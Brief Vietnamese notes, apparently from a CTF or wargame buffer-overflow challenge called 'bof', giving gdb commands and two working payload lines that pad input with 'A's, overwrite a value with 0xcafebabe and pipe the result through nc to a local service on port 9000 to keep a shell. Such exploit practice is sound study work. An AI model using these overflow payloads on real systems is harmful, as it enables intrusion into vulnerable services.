gdb ./bof : Debug với GDB thông thường
disassemble func: Xem disassembly hàm func

0x0e3a2100

(python2 -c 'print "A"*51 + "\xbe\xba\xfe\xca"'; cat) | nc 0 9000

bof@ubuntu:~$ (python2 -c 'print "A"*32 + "\x00\x21\x3a\x0e" + "A"*16 + "\xbe\xba\xfe\xca"'; cat) | nc 0 9000